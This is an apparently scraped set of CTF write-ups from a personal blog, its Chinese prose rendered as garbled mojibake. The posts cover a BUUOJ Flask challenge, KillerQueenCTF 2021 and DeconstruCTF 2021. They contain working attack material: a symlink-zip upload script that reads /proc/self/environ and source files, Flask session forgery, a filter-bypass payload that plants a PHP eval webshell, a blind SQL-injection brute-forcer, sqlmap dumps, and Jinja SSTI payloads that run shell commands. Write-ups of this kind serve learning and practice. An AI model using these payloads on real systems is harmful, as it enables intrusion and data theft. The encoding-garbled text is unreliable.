sshè¿ä¸Šåçœ‹ä¸‹ç›®å½•ç»“æ„\næŸ¥çœ‹/app/y0u_found_it/y0u_found_it_main.py\n11è¡Œè¿™ä¸æ˜¯å…¸ä¸­å…¸äº†ï¼Ÿè¯»macåœ°å€å°±æ‰“é€šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠSECRET_KEYæ”¹ä¸ºä¸€ä¸ªåˆé•¿åˆä¹±çš„éšæœºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥ä½¿ç”¨uuid/guidç”Ÿæˆå™¨æ¥ç”Ÿæˆ\nâ€”â€”â€”â€”ç¢ç¢å¿µï¼šè¿™é‡Œä¿®å¤çš„æ—¶å€™å¯èƒ½çœ‹è„¸ï¼Ÿæˆ‘åœ¨å‡ å¤©å‰è¯•çš„æ—¶å€™ç”¨çš„ä¸€æ¨¡ä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æ€ä¹ˆéƒ½ä¸èƒ½è¿‡checkï¼Œä»Šå¤©è¯•äº†ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨å†™wpçš„æ—¶å€™å†å¤ç›˜å°±åˆä¸å¯ä»¥äº†â€¦â€¦emmm å¯èƒ½è¿˜æ˜¯å“ªé‡Œçš„ç»†èŠ‚å‡ºäº†é”™ä½†æ˜¯æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Ÿç»™æˆ‘æ•´ä¸ä¼šäº†å±äºæ˜¯\nå…³äºæœ¬é¢˜ æ˜¯ä¸ªåŸé¢˜ï¼Œè¿˜æ˜¯ä¸ªæœ‰äº†åŒ…æµ†çš„åŸé¢˜ï¼Œå‚è§-\u0026gt;[HCTF 2018]Hideandseek | [SWPU2019]Web3ï¼Œåšè¿‡çš„å°±çŸ¥é“è¿™ä»–å¦ˆçœŸçš„å°±ä¸€æ¨¡ä¸€æ ·hhhhhhhh\nè€ƒç‚¹åœ¨äºlinuxè½¯é“¾æ¥+uuid+flask-sessionä¼ªé€ ï¼Œåè€…è¿˜ç»å¸¸å•ç‹¬å‡ºé¢˜ï¼Œæ¯”å¦‚ [CISCN2019 åä¸œå—èµ›åŒº]Web4ï¼Œéƒ½å¿«çƒ¤çƒ‚äº†\nè€ƒç‚¹ä¸€ Â· uuid\u0026amp;SECRET_KEY SECRET_KEYé€šè¿‡uuid+ä¼ªéšæœºæ•°çš„æ–¹å¼ç”Ÿæˆï¼Œè¿™ä¸ªè€ƒç‚¹å¯ä»¥å‚è€ƒ [CISCN2019 åä¸œå—èµ›åŒº]Web4ï¼Œå…¶ä¸­app.pyæ˜¯è¿™æ ·å†™çš„\nuuid.getnode()ä¼šä»¥48ä½äºŒè¿›åˆ¶é•¿åº¦çš„æ­£æ•´æ•°å½¢å¼è¿”å›macåœ°å€ï¼Œlinuxä¸‹macåœ°å€çš„ä½ç½®åœ¨/sys/class/net/eth0/addressï¼Œè¯»å‡ºmacåœ°å€åæˆ‘ä»¬ä¹Ÿæ¥ç”Ÿæˆä¸€æ³¢ä¼ªéšæœºæ•°\nä¹‹åé€šè¿‡flask-session-cookie-managerä¸€æŠŠæ¢­å³å¯ä¼ªé€ sessionå€¼\nâ€”â€”â€”â€”å¦å¤–ï¼Œé€šå¸¸è®¿é—®ä¸å­˜åœ¨ç›®å½•æ—¶SECRET_KEYä¼šå‡ºç°åœ¨è¯·æ±‚å¤´ä¸­\nè€ƒç‚¹äºŒ Â· linuxè½¯é“¾æ¥æ–‡ä»¶è¯»å–\u0026amp;zipå‹ç¼©åŒ… ln -sæ˜¯linuxä¸­çš„è½¯é“¾æ¥å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œå¯¹åº”æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„è½¯é“¾æ¥æ¥è¯»æ–‡ä»¶ï¼›å½“ä¸çŸ¥é“flaskå·¥ä½œç›®å½•å¯ä»¥ä½¿ç”¨/proc/self/cwdæ¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ç›®å½•\nln -s /proc/self/cwd/flag/flag/.jpg qwe æˆ–è€…é€šè¿‡/proc/self/environæ–‡ä»¶é‡ŒåŒ…å«è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å–flaskçš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ¶ä½œè½¯é“¾æ¥ï¼ˆå…³äº/procçš„æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§-\u0026gt;/procç›®å½•çš„å¦™ç”¨ | LFItoRCEåˆ©ç”¨æ€»ç»“ï¼Œé¢˜-\u0026gt;[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown\nln -s /proc/self/environ qwe è€Œå¯¹äºç›®å½•å†…æ–‡ä»¶çš„åˆ—ä¸¾ä¹Ÿæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå‚è§-\u0026gt;34C3 CTF Webé¢˜ extract0r Writeup\nç”šè‡³ä¹Ÿå¯ä»¥å†™å…¥shellï¼Œå‚è§-\u0026gt;[æ·±è‚²æ¯ 2021]Zipzip\nåˆ¶ä½œå¥½çš„è½¯é“¾æ¥é€šè¿‡zipæ‰“åŒ…\nzip -ry qwe.zip qwe æ›´å¤šé¢˜ç›®ä¸­çš„åº”ç”¨å¯ä»¥å‚è§-\u0026gt;è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•\nå…³äºè¿™ä¸ªæ¼æ´çš„å®é™…åº”ç”¨å¯ä»¥å‚è§-\u0026gt;GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´\n*ATTACK exp.py - 1 ç”Ÿæˆè½¯é“¾æ¥\u0026amp;zip\u0026amp;è‡ªåŠ¨ä¸Šä¼ \nimport requests import os import sys url = \u0026#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload\u0026#39; def makezip(): os.system(\u0026#39;ln -s \u0026#39;+sys.argv[1]+\u0026#39; exp\u0026#39;) # os.system(\u0026#39;zip --symlinks exp.zip exp\u0026#39;) os.system(\u0026#39;zip -ry exp.zip exp\u0026#39;) makezip() files = {\u0026#39;the_file\u0026#39;:open(\u0026#39;./exp.zip\u0026#39;, \u0026#39;rb\u0026#39;)} def exploit(): res = requests.post(url, files=files) print(res.text) exploit() os.system(\u0026#39;rm -rf exp\u0026#39;) os.system(\u0026#39;rm -rf exp.zip\u0026#39;) python3 exp.py /proc/self/environ python3 exp.py /app/y0u_found_it.ini python3 exp.py /app/y0u_found_it/y0u_found_it_main.py python3 exp.py /sys/class/net/eth0/address exp.py - 2 æ ¹æ®macåœ°å€ç”Ÿæˆä¼ªéšæœºæ•°\nimport uuid import random mac = \u0026#34;02:42:0a:00:cb:06\u0026#34; temp = mac.split(\u0026#39;:\u0026#39;) temp = [int(i,16) for i in temp] temp = [bin(i).replace(\u0026#39;0b\u0026#39;,\u0026#39;\u0026#39;).zfill(8) for i in temp] temp = \u0026#39;\u0026#39;.join(temp) mac = int(temp,2) random.seed(mac) result = str(random.random()*100) print(result) # 36.014406163923596 python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc\u0026#39; python3 flask_session_cookie_manager3.py encode -s \u0026#39;36.014406163923596\u0026#39; -t \u0026#34;{u\u0026#39;username\u0026#39;: u\u0026#39;admin\u0026#39;}\u0026#34; ç¿»å›å¤´çœ‹æºç ï¼Œå¥½å®¶ä¼™è¿™é‡Œæœ‰å†…é¬¼\nè¿”å›çš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œè€Œæ˜¯secret.secretä¸­çš„å†…å®¹no flah\n67è¡Œè¿™é‡Œä¼šå¯¹unzipæ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œåªè¦å«æœ‰flagå­—æ ·å°±ä¼šé‡å®šå‘è‡³/?error=1\nâ€”â€”â€”â€”è¿™é‡Œæˆ‘æ„Ÿè§‰åŸé¢˜åº”è¯¥secret.pyä¸­çš„secret=ç›´æ¥å°±èƒ½è¯»å‡ºæ¥flagï¼Œæƒ³äº†å¥½ä¹…ï¼Œå†ç»•ä¸€å±‚flag.txtçš„è¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ä»€ä¹ˆbypassçš„æ–¹æ³•äº†ï¼Œæˆ‘å€¾å‘äºæ˜¯å¸ƒç½®ç¯å¢ƒçš„æ—¶å€™æ²¡æœ‰è®¾ç½®è¿™ä¸€ç‚¹ï¼ˆ\n***[CISCN2021 æ€»å†³èµ›]easy_python ä¸çŸ¥é“æ˜¯æˆ‘çš„ç½‘ç»œé—®é¢˜è¿˜æ˜¯ä»€ä¹ˆæœªçŸ¥çš„bugâ€¦â€¦checkä¹‹åå°±ä¼šå®•æœºï¼Œåªèƒ½é‡æ–°ä¸‹å‘é¶æœº\n***[CISCN2021 æ€»å†³èµ›]ezj4va https://juejin.cn/post/6997314123918737422\nè¿˜ä¸ä¼šjava å…ˆç©ºç€TAT\n","date":"2021-11-07T08:57:29+08:00","permalink":"https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/","section":"posts","tags":["wp"],"title":"buuojåŠ å›ºé¢˜ Wp"},{"categories":["CTF"],"contents":"web/Just Not My Type I really don\u0026rsquo;t think we\u0026rsquo;re compatible (Link)\n\u0026lt;?php $FLAG = \u0026#34;shhhh you don\u0026#39;t get to see this locally\u0026#34;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $password = $_POST[\u0026#34;password\u0026#34;]; if (strcasecmp($password, $FLAG) == 0) { echo $FLAG; } else { echo \u0026#34;That\u0026#39;s the wrong password!\u0026#34;; } } ?\u0026gt; æˆ‘ä»¬çš„è€æœ‹å‹strcasecmp()å‡½æ•°ï¼Œå®ƒå’Œstrcmp()å‡½æ•°ä¸€æ ·ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒºåˆ«æ˜¯åè€…ä¼šåŒºåˆ†å¤§å°å†™ï¼›ç»•è¿‡æ–¹å¼æ˜¯ä¼ å…¥æ•°ç»„ï¼Œè¿™æ ·ä¼šä½¿ä¸¤ä¸ªå‡½æ•°æ— æ³•å¤„ç†è€Œè¿”å›null\nflag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}\nweb/PHat Pottomed Girls Now it\u0026rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (Link)\n\u0026lt;?php session_start(); function generateRandomString($length = 15) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function filter($originalstring) { $notetoadd = str_replace(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;\u0026#34;, $originalstring); $notetoadd = str_replace(\u0026#34;?\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;\u0026lt;?\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;flag\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fopen\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fread\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;file_get_contents\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fgets\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cat\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;strings\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;less\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;more\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;head\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tail\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;dd\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cut\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;grep\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tac\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;awk\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;sed\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;read\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;system\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); return $notetoadd; } if(isset($_POST[\u0026#34;notewrite\u0026#34;])) { $newnote = $_POST[\u0026#34;notewrite\u0026#34;]; //3rd times the charm and I\u0026#39;ve learned my lesson. Now I\u0026#39;ll make sure to filter more than once :) $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[\u0026#34;notes\u0026#34;], \u0026#34;$filename.php\u0026#34;); file_put_contents(\u0026#34;$filename.php\u0026#34;, $notetoadd); header(\u0026#34;location:index.php\u0026#34;); } ?\u0026gt; ç®€å•çœ‹ä¸€ä¸‹æµç¨‹ï¼Œfilter()å‡½æ•°ä¼šå¯¹æˆ‘ä»¬postä¼ å…¥çš„notewriteå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯ä¼šè¢«å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼‰è¿›è¡Œæ¯”è¾ƒä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ–‡ä»¶åæ˜¯generateRandomString()ç”Ÿæˆçš„éšæœºåå­—ï¼Œä½†æ˜¯ä¸é‡è¦ï¼Œå®ƒä¼šè‡ªåŠ¨æ‹¼ä¸Š.phpçš„åç¼€å¹¶ä¸”æŠŠåå­—å†™åˆ°session['notes']ä¸­ï¼›æ‰€ä»¥æˆ‘ä»¬å”¯ä¸€éœ€è¦å¤„ç†çš„å°±æ˜¯filter()å‡½æ•°çš„ç»•è¿‡äº†\nå°´å°¬çš„æ˜¯è¿™ä¸ªfilter()è·Ÿä¸ªç­›å­ä¸€æ ·â€¦â€¦é¦–å…ˆæ˜¯æ²¡æœ‰è¿‡æ»¤eval()ï¼Œå…¶æ¬¡æ˜¯str_replace()ä¹Ÿæ˜¯æ°´çš„ä¸€æ‰¹\npayload:\nnotewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B ä¹‹åè¿ä¸Šèšå‰‘å³å¯æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„flag.php\nflag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}\nforensics/Obligatory Shark remember to wrap the flag\nçœ‹tcpæµï¼Œtelnetæ˜æ–‡æµé‡\n33a465747cb15e84a26564f57cda0988\nflag{dancingqueen}\n","date":"2021-10-30T16:39:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/","section":"posts","tags":["wp"],"title":"KillerQueenCTF2021 Wp"},{"categories":["CTF"],"contents":"https://ctftime.org/event/1453/tasks/\nWeb/Here\u0026rsquo;s a Flag A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?\nhttps://www.youtube.com/watch?v=dQw4w9WgXcQ ä¸ç”¨çœ‹äº† Never Gonna Give You Up\nçœ‹style.css flag: \u0026ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}\u0026rdquo;; ä½†æ˜¯ä¸æ˜¯æœ€ç»ˆçš„flagï¼Œè§£ä¸€ä¸‹rot13 amount=23\ndsc{we0come_to_deconstructf}\nç­¾åˆ°é¢˜ä¹Ÿå¥½æŠ˜è…¾TAT\nWeb/Please Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company\u0026rsquo;s servers. I know it\u0026rsquo;s been a while, but could you please try to access those files? I would be very grateful!\nç†Ÿç»ƒæŠ“åŒ…ï¼ŒCookieä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒAdmin_Accesså’ŒUsernameï¼Œæ”¹ä¸ºTrueå’ŒClancy\næ”¹æµè§ˆå™¨æ ‡è¯†å¤´ User-Agent: DeemBrowser\néœ€è¦åŸºç¡€è®¤è¯ï¼Œä½†æ˜¯è¿™é‡Œçš„MagicWordç¨å¾®å¡äº†ä¸€ä¸‹\nåŸå› æ˜¯æˆ‘å¤ªé“¸å¸äº†å¿˜äº†åŠ Basicï¼ŒAuthorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==\nåŠ ä¸€ä¸ªæ—¥æœŸçš„å¤´ï¼ŒDate: Thu, 1 Apr 2021 12:00:00 GMT\næ¢æˆDate: Mon, 5 Apr 2021 12:00:00 GMT\ndsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}\nWeb/Taxi Union Problems An important package has been stolen from Mr Nagaraj by a Taxi driver. We\u0026rsquo;ve tried to ask the local taxi union about driver\u0026rsquo;s location but they are refusing provide the same.\nSince this package is required for a time sensitive matter we don\u0026rsquo;t have time to negotiate with the union.\nYour task is to obtain the location of the taxi using the given information Taxi Lisence Plate: TN-06-AP-9879\nHINT: The flag is the location of the taxi (no caps)\nè¾“å…¥TN-06-AP-9879'--%20å›æ˜¾ä¸€æ ·ï¼Œæœ‰æ³¨å…¥ï¼ŒæŠŠpostçš„å†…å®¹æ‹¿å»è®©sqlmapè·‘ä¸€ä¸‹\npython sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate --tables python sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate -T taxi --columns python sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate -T taxi --dump Ayanavaram\n*Web/Never gonna lie to you Trust me, take everything in the home page for face value. I would never lie to you.\nä¸»é¡µæœ‰ä¸€å¥Not even search engines can find it.ï¼Œæç¤ºæˆ‘ä»¬çœ‹/robots.txt\nè½¬åˆ°/never_gonna_give_you_upé¡µé¢ï¼Œæ ‡é¢˜æ˜¯Admin Pageä½†æ˜¯ä¸€ç‰‡ç©ºç™½ï¼ŒæŠ“åŒ…åçœ‹åˆ°postè¡¨å•çš„åœ°æ–¹è¢«æŠ¬å¤´ç»™æŒ¡ä½äº†ï¼Œç›®æ ‡åœ°å€æ˜¯/never_gonna_let_you_down\næäº¤ä¸¤ä¸ªå‚æ•°usernameå’Œpasswordï¼Œå›æ˜¾YOU LIED TO ME !!!\nâ€”â€”â€”â€”ç„¶åæ²¡ç„¶åäº† æˆ‘è¿˜æ²¡çœ‹å®Œ ç¯å¢ƒå°±å…³äº†TAT\nWeb/Curly Fries 1 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. The flag is right in front of you.\nemmmmm æ²¡æœ‰ä»»ä½•æç¤º\nçœ‹wpä»¥åå‘ç°è¿™æ˜¯çœŸè„‘æ´äº†ï¼Œä½†ä¹Ÿä¸èƒ½è¿™ä¹ˆè¯´ï¼Œæ¯•ç«Ÿå·²ç»ç»™å‡ºäº†Swedenå¾ˆæ˜æ˜¾çš„æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ç”¨æŒ‡å®šçš„Swedishè¯­è¨€æ¥è®¿é—®è¿™ä¸ªç½‘ç«™\ncurl -i http://very.uniquename.xyz:8880/ -H \u0026#34;Accept-Language: sv-SE\u0026#34; dsc{1_l0v3_sw3d3n}\nWeb/The Gate Keeper That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.\nNote: This challenge might require a bruteforce approach.\nè¿˜æ˜¯sqli\nimport requests import string flag = \u0026#39;\u0026#39; print(flag) domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026#39;_}\u0026#39; f = 0 challenge = \u0026#34;gate keeper\u0026#34; url = \u0026#34;\u0026#34; check = \u0026#34;\u0026#34; key = \u0026#34;\u0026#34; column = \u0026#34;\u0026#34; if challenge == \u0026#34;taxi union\u0026#34;: url = \u0026#39;http://extremely.uniquename.xyz:2052/\u0026#39; check = \u0026#34;TN-06-AP-9879\u0026#34; key = \u0026#39;lisence_plate\u0026#39; column = \u0026#34;location\u0026#34; elif challenge == \u0026#39;gate keeper\u0026#39;: url = \u0026#39;http://extremely.uniquename.xyz:2082/\u0026#39; check = \u0026#34;The flag for the CTF is the password you entered.(If you havent cheated that is)\u0026#34; key = \u0026#39;password\u0026#39; column = \u0026#34;password\u0026#34; print(\u0026#34;URL\u0026#34;, url) while True: for char in domain: payload = \u0026#34;\u0026#39; or {} like \u0026#39;{}%\u0026#39;; --\u0026#34;.format(column, flag + char) print(payload) r = requests.post(url, data={key: payload}) if (check in r.text): flag = flag + char print(\u0026#34;Success \u0026#34; + flag) break Web/Hungry Man There is nothing here I promise! ;)\næŠ“åŒ…ï¼Œcookieéƒ¨åˆ†æœ‰ä¸€ä¸ªb64ï¼Œè§£ç å\nè¯´å®è¯ï¼Œè¿™ä¸ªé¢˜åšçš„æ—¶å€™æ²¡æ³¨æ„set-cookieçš„éƒ¨åˆ†ï¼Œå‚è€ƒwp\nè¿™é‡Œçš„ä¾æ®set-cookieçš„å€¼è®¾ç½®åï¼Œä¼šä¸æ–­çš„äº§ç”Ÿæ–°çš„md5-hashçš„cookieå€¼ï¼Œå†™ä¸€ä¸ªè„šæœ¬ä¸æ–­åœ°è®¾ç½®å’Œåº”ç”¨æ–°çš„cookieï¼Œå°†è¿™äº›è§£å¯†åæ‹¼èµ·æ¥å°±æ˜¯flagäº†\ndsc{91v3_m3_4_h4ndfu1_0f_c00k135}\nWeb/Curly Fries 2 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. Why do logos make things so recognizable?\næ— æç¤ºï¼Œå‚è€ƒwp\næœ‰ç‚¹è„‘æ´äº†ï¼ŒæŠŠUser-Agentçš„åœ°æ–¹è®¾ç½®ä¸ºxboxå’ŒLinuxä¹‹åï¼Œå›¾ç‰‡ä¼šæ¶ˆå¤±å¹¶éœ²å‡ºflag\ndsc{1m4g1n3_l1nux_0n_4n_xb0x}\nWeb/Curly Fries 3 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. I\u0026rsquo;m with you, every step of the way.\nç›´æ¥è®¿é—®æç¤º405ï¼Œpostä¸€ä¸‹å›æ˜¾perhaps try Googling me instead?\nè®¿é—®/robots.txtï¼Œ404\nç”¨wappalyzerå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨\nå‚è€ƒwp\nçœ‹åˆ°ç¬¬ä¸€ä¸ªæç¤ºä¹‹åä¸å¤Ÿæ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æ¥æºreferæ˜¯google.com\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; http://overly.uniquename.xyz:2095/ å›æ˜¾ä¸­æç¤ºæˆ‘ä»¬å†è®¾ç½®Host\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H\u0026#34;Host:https://dscvit.com\u0026#34; http://overly.uniquename.xyz:2095/ å›æ˜¾potates and carrots are my friends, milk and Cookies will be my endï¼Œä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯åº”è¯¥è®¾ç½®cookie=root\nä¹‹åå›æ˜¾JFATHER, JMOTHER, JDAUGHTER, ____?ï¼Œæç¤ºæŠŠcontent-typeæ”¹ä¸ºjson\nå›æ˜¾*{\u0026rsquo;error\u0026rsquo;: \u0026lsquo;json data missing\u0026rsquo;}*ï¼Œæ·»åŠ ä¸€ç‚¹data\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H \u0026#34;Host: https://www.dscvit.com\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; --cookie \u0026#34;user=root\u0026#34; -d \u0026#39;{\u0026#34;foo\u0026#34;:\u0026#34;bar\u0026#34;}\u0026#39; http://overly.uniquename.xyz:2095/ å›æ˜¾*{\u0026rsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;required\u0026rsquo;}}ï¼Œå°†fooæ”¹ä¸ºbarï¼Œå›æ˜¾{\u0026rsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;which club am i at?\u0026rsquo;}}*\n*ä¸å¤ªæ‡‚ä¸ºå•¥è¿™å°±èƒ½çŸ¥é“æŠŠbarèµ‹å€¼ä¸ºPSGï¼Ÿï¼Ÿï¼Ÿ\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H \u0026#34;Host: https://www.dscvit.com\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; --cookie \u0026#34;user=root\u0026#34; -d \u0026#39;{\u0026#34;messi\u0026#34;:\u0026#34;psg\u0026#34;}\u0026#39; http://overly.uniquename.xyz:2095/ å¾—åˆ°flag dsc{th15_15_w4y_t00_much_w0rk}\nWeb/Mega Mailer We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?\nè®²çœŸï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡\né¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šå¼€ä¸€ä¸ªsmtpçš„æœåŠ¡ï¼Œç”¨pythonå¼€\npython3 -m smtpd -c DebuggingServer -n 0.0.0.0:25 ç„¶åå…¶å®ƒä¿¡æ¯æ­£å¸¸å¡«ï¼Œbodyéƒ¨åˆ†å­˜åœ¨sstiæ³¨å…¥ï¼Œpayloadæ¥è‡ªäºPayloadsAllTheThings\n{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;ls -a\u0026#39;).read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;cat flag\u0026#39;).read()}} dsc{819_8r41n_m41L3R}\nå‚è€ƒï¼šwp\nè¯´å®è¯ï¼Œè¿™ä¸€ç¯‡wpæ—©å°±æ°´å®Œäº†ï¼Œä½†æ˜¯ä¸­é—´é‚£ä¸ªNever gonna lie to youçš„é¢˜å› ä¸ºæ²¡æœ‰åœ°æ–¹å¤ç°ä¹Ÿæ²¡æœç€åˆ«çš„wpå°±ä¸€ç›´æ‹–ç€ï¼Œæ‹–åˆ°ç°åœ¨ï¼Œè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ”¾å¼ƒäº†ï¼Œå¯æƒœæ­»äº†ï¼Œè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬åšé¢˜å¤ç°è¦è¶æ—©\n","date":"2021-10-30T13:35:32+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/","section":"posts","tags":["wp"],"title":"DeconstruCTF2021 Wp"},{"categories":[],"contents":"å†™åœ¨å‰é¢ è¿™å°†è‚¯å®šæ˜¯ä¸ªé•¿æœŸæ›´æ–°çš„ç³»åˆ—äº†â€¦â€¦\næˆ‘å¯¹äºâ€œç¾åŒ–xxâ€æ€»æœ‰ä¸€ç§ç—´è¿·çš„çˆ±å¥½ï¼Œå°å­¦çš„æ—¶å€™å°±æŠ˜è…¾è¿‡é›¨æ»´æ¡Œé¢ï¼ˆç°åœ¨ç¿»qqé‚®ç®± è¿˜èƒ½æ‰¾åˆ°14å¹´çš„è¿œå¤é‚®ä»¶ï¼‰è™½ç„¶å¯æƒœçš„æ˜¯å½“æ—¶çš„æˆªå›¾æ²¡æœ‰ä¿ç•™ä¸‹æ¥ï¼Œä½†å°è±¡ä¸­æ˜¯å¾ˆæ¼‚äº®å¾ˆæ¼‚äº®çš„\nä¹Ÿæ˜¯é‚£ä¸ªæ—¶å€™ï¼Œå¼€å§‹ç»™è‡ªå·±çš„æ‰‹æœºåˆ·æœº ä¸ºäº†æ¢æ›´å¥½çœ‹çš„å­—ä½“å’Œæ¨¡å—ï¼ˆé‚£æ˜¯ä¸ªæµ·ä¿¡çš„å®‰å“æœº å¾ˆä¾¿å®œ ä¹Ÿæ˜¯äººç”Ÿä¸­ç¬¬ä¸€éƒ¨æ‰‹æœºï¼‰ï¼Œå®³ å½“ç„¶ç”¨çš„æ˜¯xxä¸€é”®rootå·¥å…·ä¹‹ç±»çš„ï¼Œç»“æœåˆšåˆ·å¥½ä¸€ä¼šå°±å˜ç –äº† = =ï¼ˆå½“ç„¶è¿™ä¸é‡è¦ï¼‰\nåˆä¸­ä¹‹åæ‰‹æœºä¹Ÿæ¢æˆäº†å°ç±³ï¼Œæ›´æ˜¯ä¸‰å¤©ä¸¤å¤´çš„åˆ·ä¸»é¢˜å•†åº— 